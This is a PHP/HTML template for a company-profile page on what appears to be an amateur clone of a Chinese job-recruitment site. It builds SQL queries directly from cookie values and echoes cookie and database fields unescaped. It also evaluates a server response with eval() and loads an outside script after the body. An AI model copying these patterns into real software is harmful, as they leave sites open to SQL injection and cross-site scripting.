<!DOCTYPE HTML>
<html xmlns:wb="http://open.weibo.com/wb"><head>
</script><script type="text/javascript" async src="style/js/conversion.js"></script><script src="style/js/allmobilize.min.js" charset="utf-8" id="allmobilize"></script><style type="text/css"></style>
<meta content="no-siteapp" http-equiv="Cache-Control">
<link  media="handheld" rel="alternate">
<!-- end 云适配 -->
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title><?php echo $_COOKIE["user"];?>-拉勾网-最专业的互联网招聘平台</title>


<!-- <div class="web_root"  style="display:none">http://www.lagou.com</div> -->
<script type="text/javascript">
var ctx = "http://www.lagou.com";
console.log(1);
</script>
<link rel="icon" href="style/images/topico.ico">
<link href="style/css/style.css" type="text/css" rel="stylesheet">
<link href="style/css/external.min.css" type="text/css" rel="stylesheet">
<link href="style/css/popup.css" type="text/css" rel="stylesheet">
<script type="text/javascript" src="style/js/jquery.1.10.1.min.js"></script>
<script src="style/js/jquery.lib.min.js" type="text/javascript"></script>
<script type="text/javascript" src="style/js/ajaxfileupload.js"></script>
<script src="style/js/additional-methods.js" type="text/javascript"></script>
<!--[if lte IE 8]>
    <script type="text/javafunctionscript" src="style/js/excanvas.js"></script>
<![endif]-->
<script type="text/javascript">
var youdao_conv_id = 271546; 
</script> 
<script src="style/js/conv.js" type="text/javascript"></script>
<script src="style/js/ajaxCross.json" charset="UTF-8"></script>
<style>
.gg{
	height:40px;
	width:180px;
	font-size:18px;
	color:#999;
	border:2px solid #f1f1f1;
	line-height:40px;
	font-family:"微软雅黑";
	}
</style>

</head>
<body>

<?php 
include('conn.php');
$sql="select * from com where cid='{$_COOKIE["id"]}'";
$sql2="select * from job where cid='{$_COOKIE["id"]}'";
$result=mysqli_query($con, $sql);
$result2=mysqli_query($con, $sql2);
while
	 ($row=mysqli_fetch_array($result)){
	  $cid= $row[0];
    $cname = $row[1];
	$ctx = $row[3];
	$cintro=$row[4];
	$comjs=$row[5];
    $ccity = $row[6];
	$cfield = $row[7];
	$csize=$row[8];
	$chome=$row[9];
	$cnumber=$row[10];

	}
	
?>





<div id="body">
	<div id="header">
    	<div class="wrapper">
<a href="index.php" class="logo">
    			<img src='style/images/logo1.png' width="207" height="52" alt="赚钱了大学生就业网站" />
    		</a>
            
    		<ul class="reset" id="navheader">
    			<li ><a href="index.php">首页</a></li>
    			<li ><a href="companylist.php" >公司</a></li>
    			<li ><a href="xjh.php" rel="nofollow">宣讲会</a></li>
    			<li ><a href="guide.php" rel="nofollow">求职指导</a></li>
	    		    		</ul>
        	        	<?php if(!isset($_COOKIE["user"])){   echo'<ul class="loginTop">
            	<li><a href="login.html" rel="nofollow">登录</a></li> 
            	<li>|</li>
            	<li><a href="register.html" rel="nofollow">注册</a></li>
            </ul> ';}   
                                            
                            
 else{  echo' <dl class="collapsible_menu">
            	<dt>
           			<span>
                     
  '.$_COOKIE["user"].'

&nbsp;</span> 
            		<span class="red dn" id="noticeDot-0"></span>
            		<i></i>
            	</dt>'; if(isset($_COOKIE["type"])){
					if($_COOKIE["type"]=="stu"){
                       echo'         	<dd><a rel="nofollow" href="jianli.php">我的简历</a></dd>
                	                	<dd><a href="myapply.php">我申请的职位</a></dd>
                	                	                	<dd class="btm"><a href="subscribe.php">我的推荐</a></dd><dd><a href="updatePwd.php">密码修改</a></dd><dd ><a rel="nofollow" href="exit.php">退出</a></dd>';}
															else{
                       echo'  
<dd style="display: none;"><a href="positions.php">我发布的职位</a></dd>
                	<dd style="display: none;"><a href="undeal.php">我收到的简历</a></dd>
                	<dd class="btm" style="display: none;"><a href="myhome.php">我的公司主页</a></d>
					<dd><a href="updatePwd.php">密码修改</a></dd><dd><a href="exit.php">退出</a></dd>';}}'
                                               
                                <dd ><a rel="nofollow" href="exit.php">退出</a></dd>
            </dl> ';}  ?>
                                </div>
    </div><!-- end #header -->
    <div id="container">
        <!-- <script src="style/js/swfobject_modified.js" type="text/javascript"></script> -->
      <div class="clearfix">
        				
            <div class="content_l">           
	                <div class="c_detail">
	                	<div style="background-color:#fff;" class="c_logo">
		                	<a title="上传公司LOGO" id="logoShow" class="inline cboxElement" href="#logoUploader">
		                				                			<img width="190" height="190" alt="公司logo" src="<?php echo $ctx;?>">
	                        		                        	
	                        	<span>更换公司图片<br>190px*190px 小于5M</span>
	                        </a>
		                </div>
		                
		                <!--  			                <div class="c_logo" style="background-color:#fff;">
			                	<div id="logoShow">
			                		<img src="style/images/logo_default.png" width="190" height="190" alt="公司logo" />
		                        	<span>更换公司图片<br />190px*190px 小于5M</span>
		                        </div>
		                        <input onchange="img_check(this,'http://www.lagou.com/cd/saveProfileLogo.json',25927,'logo');" type="file" id="logo" name="logo" title="支持jpg、jpeg、gif、png格式，文件小于5M" />
			                     
			                </div>
		                    <span class="error" id="logo_error" style="display:none;"></span>
						     -->
		                
	                    <div class="c_box companyName">
	                    		                   			<h2 title="<?php echo $cname; ?>"><?php echo $cname; ?></h2>
	                   			                        
	                        	                        	
                        		<span class="va dn">拉勾未认证企业</span>
	                        	
	                        	                        <div class="clear"></div>
	                       	
	                       		                   			<h1 title="<?php echo $cname; ?>" class="fullname"><?php echo $cname; ?></h1>
	                       		                   			<p title="<?php echo $cname; ?>">&nbsp;</p>
	                        	                        
	                        <form class="clear editDetail dn"  method="post" action="mycomxx.php">
	                            <input type="text" placeholder="请输入公司简称" maxlength="15" value="<?php echo $cname; ?>" name="comName" id="comName">
	                            <input type="text" placeholder="介绍公司优势，核心价值"  value="<?php echo $cintro; ?>" name="cintro" id="cintro" >

                                	
	                            <input type="hidden" value="25927" id="companyId" name="companyId">
	                            <input type="submit" value="保存" id="saveDetail" class="btn_small">
	                            <a id="cancelDetail" class="btn_cancel_s" >取消</a>
		                    </form>
	                            
	                        <div class="clear oneword"><img width="17" height="15" src="style/images/quote_l.png">&nbsp; <span><?php echo $cintro; ?></span> &nbsp;<img width="17" height="15" src="style/images/quote_r.png"></div>

	                        <h3 class="dn">已选择标签</h3>
	
                          <div class="dn" id="addLabels">
	                        	<a id="changeLabels" class="change" href="javascript:void(0)">换一换</a>
	                        	<input type="hidden" value="1" id="labelPageNo">
	                            <input type="submit" value="贴上" class="fr" id="add_label">
                            	<input type="text" placeholder="添加自定义标签" name="label" id="label" class="label_form fr">	
	                            <div class="clear"></div>
	                            <ul class="reset clearfix"> </ul>
	                            <a id="saveLabels" class="btn_small" href="javascript:void(0)">保存</a>
	                            <a id="cancelLabels" class="btn_cancel_s" href="javascript:void(0)">取消</a>
	                        </div>
	                    </div>
	                    <a title="编辑基本信息" class="c_edit" id="editCompanyDetail" href="javascript:void(0);"></a>
	                	<div class="clear"></div>
	                </div>
                
                	<div class="c_breakline"></div>
       
       				<div id="Product">
        					        				
	        					<div class="product_wrap">

						    		<!--无产品 -->
									<dl class="c_section dn">
					                	<dt>
					                    	<h2><em></em>公司产品</h2>
					                    </dt>
					                    <dd>
					                    	<div class="addnew">
					                        	酒香不怕巷子深已经过时啦！<br>
												把自己优秀的产品展示出来吸引人才围观吧！<br>
					                            <a class="product_edit" href="javascript:void(0)">+添加公司产品</a>
					                        </div>
					                    </dd>
					                </dl>
	                
					            	<!--产品编辑-->
					                <dl id="newProduct" class="newProduct dn">
					                	<dt>
					                    	<h2><em></em>公司产品</h2>
					                    </dt>
					                    <dd>
					                        <form method="post" class="productForm">
					                            <div class="new_product">
					                            	
							                            <div class="product_upload dn productNo">
							                                <div>
							                                	<span>上传产品图片</span> 
							                                    <br>	
							                                   		 尺寸：380*220px  	大小：小于5M
							                                </div>
							                            </div>
							                            <div class="product_upload productShow">
							                            	<img width="380" height="220" src="style/images/product_default.png">
								                        	<span>更换产品图片<br>380*220px 小于5M</span>
								                        </div>
							                        
							                        <input type="file" title="支持jpg、jpeg、gif、png格式，文件小于5M" onchange="product_check(this,'http://www.lagou.com/c/upload.json','productNo','productShow','type','productInfos');" name="myfiles" id="myfiles0">
							                    	<input type="hidden" value="3" name="type" class="type"> 
							                    	<input type="hidden" value="images/product_default.png" name="productPicUrl" class="productInfos">   
							                    </div>
					                            
					                            <div class="cp_intro">
					                               	<input type="text" placeholder="请输入产品名称" value="发大发" name="product">	
					                                <input type="text" placeholder="请输入产品网址" value="http://www.weimob.com" name="productUrl">	
					                                <textarea placeholder="请简短描述该产品定位、产品特色、用户群体等" maxlength="500" value="发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf" class="s_textarea" name="productProfile">发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf发达发生的faf</textarea>	
					                                <div class="word_count fr">你还可以输入 <span>500</span> 字</div>
					                                <div class="clear"></div>
					                                <input type="submit" value="保存" class="btn_small">
					                                <a class="btn_cancel_s product_delete" href="javascript:void(0)">删除</a>
					                        		<input type="hidden" value="11867" class="product_id">
					                            </div>
											</form>
					                    </dd>
					                </dl>
				                <!--有产品--></div>
       								        						    			        			</div>   <!-- end #Product --> 
       	
       				<div id="Profile">
			            				        	<div class="profile_wrap">
					             <!--无介绍 -->
									<dl class="c_section dn">
					                	<dt>
					                    	<h2><em></em>公司介绍</h2>
					                    </dt>
					                    <dd>
					                    	<div class="addnew">
					                        	详细公司的发展历程、让求职者更加了解你!<br>
					                            <a id="addIntro" href="javascript:void(0)">+添加公司介绍</a>
					                        </div>
					                    </dd>
					                </dl>
					            <!--编辑介绍-->
					                <dl class="c_section newIntro dn">
					                    <dt>
					                        <h2><em></em>公司介绍</h2>
					                    </dt>
					                    <dd>
						                    <form method="post" action="mycomxx.php">
						                        <textarea placeholder="请分段详细描述公司简介、企业文化等" name="comjs" id="comjs"></textarea><?php echo $comjs; ?></textarea>		                                        
						                        <div class="word_count fr">你还可以输入 <span>1000</span> 字</div>
						                        <div class="clear"></div>
						                        <input type="submit" value="保存" id="submitProfile" class="btn_small">
						                        <a id="delProfile" class="btn_cancel_s" href="javascript:void(0)">取消</a>
						                    </form>
					                    </dd>
					                </dl>
					            
					            <!--有介绍-->
					               <dl class="c_section">
					               		<dt>
					                   		<h2><em></em>公司介绍</h2>
					                   	</dt>
					                   	<dd>
					                   		<div class="c_intro"><?php echo $comjs; ?></div>
					                   		<a title="编辑公司介绍" id="editIntro" class="c_edit" href="javascript:void(0)"></a>
					                   	</dd>
					               	</dl>
				            </div>
				                 	
	     			</div><!-- end #Profile -->
      	
      	<!--[if IE 7]> <br /> <![endif]-->
	    
	        	 		        	<!--无招聘职位-->
						<dl id="noJobs" class="c_section">
		                	<dt>
		                    	<h2><em></em>招聘职位</h2>
		                    </dt>
		                    <dd>
		                    	<div class="addnew">
		                        	发布需要的人才信息，让伯乐和千里马尽快相遇……<br>
		                            <a href="create.php">+添加招聘职位</a>
		                        </div>
		                    </dd>
		                </dl>
	          	
	          	<input type="hidden" value="" name="hasNextPage" id="hasNextPage">
	          	<input type="hidden" value="" name="pageNo" id="pageNo">
	          	<input type="hidden" value="" name="pageSize" id="pageSize">
          		<div id="flag"></div>
            </div>	<!-- end .content_l -->
            
            <div class="content_r">
           	  <div id="Tags">
	            	<div id="c_tags_show" class="c_tags solveWrap">
	                    <table>
	                        <tbody><tr>
	                            <td width="45">地点</td>
	                            <td><?php echo $ccity;?></td>
	                        </tr>
	                        <tr>
	                            <td>领域</td><!-- 支持多选 -->
	                            <td title="移动互联网"><?php echo $cfield;?></td>
	                        </tr>
	                        <tr>
	                            <td>规模</td>
	                            <td><?php echo $csize;?></td>
	                        </tr>
	                        <tr>
	                            <td>主页</td>
	                            <td>
	                            	            							<a rel="nofollow" title="<?php echo $chome;?>" target="_blank" href="http://<?php echo $chome;?>"><?php echo $chome;?></a>
                              </td>
	                        </tr>
                            
                            <tr>
	                            <td>联系电话</td>
	                            <td>
	                            	            							<?php echo $cnumber;?>
                              </td>
	                        </tr>
	                    </tbody></table>
	                    <a id="editTags" class="c_edit" href="javascript:void(0)"></a>
	                </div>
	                <div id="c_tags_edit" class="c_tags editTags dn">
		                <form  method="post" action="mycomxx.php">
		                    <table>
		                        <tbody><tr>
		                            <td>地点</td>
		                            <td>
		                            	<input type="text" placeholder="请输入地点" value="<?php echo $ccity;?>" name="ccity" id="ccity">	
		                            </td>
		                        </tr>
		                        <tr>
		                            <td>领域</td><!-- 支持多选 -->
		                            <td>

<input type="hidden" value="<?php echo $cfield;?>" id="companySize" name="cfield">
		                            	<input type="button" value="<?php echo $cfield;?>" id="select_sca" class="select_tags">
		                                <div class="selectBox dn" id="box_sca" style="display: none;">
		                                    <ul class="reset">
		                                    			                                    						                            			<li>移动互联网</li>
				    			                            			<li>电子商务</li>
				              		                            			<li>社交</li>
				                            				                                        		                                    							<li>企业服务</li>	<li>教育</li>	<li>文化艺术</li>	<li>游戏</li>	<li>在线旅游</li>	<li>金融</li>	<li>生活服务</li>	<li>硬件</li>
  	<li>安全</li>	<li>运动体育</li>	<li>媒体</li>	<li>营销</li>	<li>云计算/大数据</li>	<li>移动广告</li>                                                                                                                                                                        
	                                      </ul>
		                                </div>	

		                                <!-- <div id="box_ind" class="selectBox dn">
		                                    <ul class="reset">
			                                    				                        							                            			<li class="current">移动互联网</li>
				                            							                            		                                    </ul>
		                                </div>	 -->
		                            </td>
		                        </tr>
		                        <tr>
		                            <td>规模</td>
		                            <td>
		                            	 <select name="csize" id="gg" class="gg">
                                         
                                                      <option value="<?php echo $csize;?>" name="csize" id="gg" class="gg"><?php echo $csize;?></option>
  <option value="少于15人">少于15人</option>
  <option value="15-50人">15-50人</option>
  <option value="50-150人">50-150人</option>
  <option value="150-500人">150-500人</option>
    <option value="500-2000人">500-2000人</option>
  <option value="2000人以上">2000人以上</option>
  
</select>
		                                <div class="selectBox dn" id="box_sca" style="display: none;">
		                                    <ul class="reset">
		                                    			                                    						                            			<li>少于15人</li>
				                            				                                        		                                    						                            			<li>15-50人</li>
				                            				                                        		                                    						                            			<li>50-150人</li>
				                            				                                        		                                    						                            			<li class="current">150-500人</li>
				                            				                                        		                                    						                            			<li>500-2000人</li>
				                            				                                        		                                    						                            			<li>2000人以上</li>
	                                      </ul>
		                                </div>	
		                            </td>
		                        </tr>
		                        <tr>
		                            <td>主页</td>
		                            <td>
                            			<input type="text" placeholder="请输入网址" value="<?php echo $chome;?>" name="chome" id="chome">	
                                       
		                            </td>
		                        </tr>
                                <tr>
		                            <td>联系电话</td>
		                            <td>
                            			<input type="text" placeholder="请输入联系电话" value="<?php echo $cnumber;?>" name="cnumber" id="cnumber">	
                                       
		                            </td>
		                        </tr>
		                    </tbody></table>
		                    <input type="hidden" id="comCity" value="上海">
		                    <input type="hidden" id="comInd" value="移动互联网">
		                    <input type="hidden" id="comSize" value="150-500人">
		                    <input type="hidden" id="comUrl" value="http://www.zmtpost.com">
		                    <input type="submit" value="保存" id="submitFeatures" class="btn_small">
		                    <a id="cancelFeatures" class="btn_cancel_s" href="javascript:void(0)">取消</a>
		                    <div class="clear"></div>
		            	</form>
	                </div>
   			  </div><!-- end #Tags -->
   			  <dl class="c_section newIntro dn">
                  <dt>
					                        <h2><em></em>公司介绍</h2>
                </dt>
					                    <dd>
						                    <form method="post" action="mycomxx.php">
						                        <textarea placeholder="请分段详细描述公司简介、企业文化等" name="comjs" id="comjs"></textarea><?php echo $comjs; ?></textarea>		                                        
						                        <div class="word_count fr">你还可以输入 <span>1000</span> 字</div>
						                        <div class="clear"></div>
						                        <input type="submit" value="保存" id="submitProfile" class="btn_small">
						                        <a id="delProfile" class="btn_cancel_s" href="javascript:void(0)">取消</a>
						                    </form>
					                    </dd>
              </dl><!-- end .c_stages -->
       				
	      
	       		<div id="Member">		
		       			       		<!--有创始团队-->
	       	  </div> <!-- end #Member -->
	       	
	       	
	       <!--公司深度报道-->
            <div id="Reported">	
	            		            <!--无报道--><!-- end .c_reported -->
              </div><!-- end #Reported -->
	       	
        </div>
   	</div>

<!-------------------------------------弹窗lightbox  ----------------------------------------->
<div style="display:none;">
	<div style="width:500px;height:200px;" class="popup" id="logoUploader">
		
        <form action="upcomtx.php" enctype="multipart/form-data" method="post" onsubmit="return checkfile()">  
    <input type="file" id="comtx" name="comtx"  />  
    <input type="hidden" name="fid" value="1" />  
    <input type="submit" name="Submit" value="上传" />  
</form>  
		 
->


	</div><!-- #logoUploader -->
</div>
<!------------------------------------- end ----------------------------------------->

<script src="style/js/company.min.js" type="text/javascript"></script>
<script>
var avatar = {};
avatar.uploadComplate = function( data ){
	var result = eval('('+ data +')');
	if(result.success){
		jQuery('#logoShow img').attr("src",ctx+ '/'+result.content);
		jQuery.colorbox.close();
	}
};
</script>
			<div class="clear"></div>
			<input type="hidden" value="d1035b6caa514d869727cff29a1c2e0c" id="resubmitToken">
	    	<a rel="nofollow" title="回到顶部" id="backtop" style="display: inline;"></a>
	    </div><!-- end #container -->
	</div><!-- end #body --><script src="style/js/core.min.js" type="text/javascript"></script>
<script src="style/js/popup.min.js" type="text/javascript"></script>

<!--  -->


<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div></body><script type="text/javascript" src="http://freemoban.com/js/a.js"></script> </html>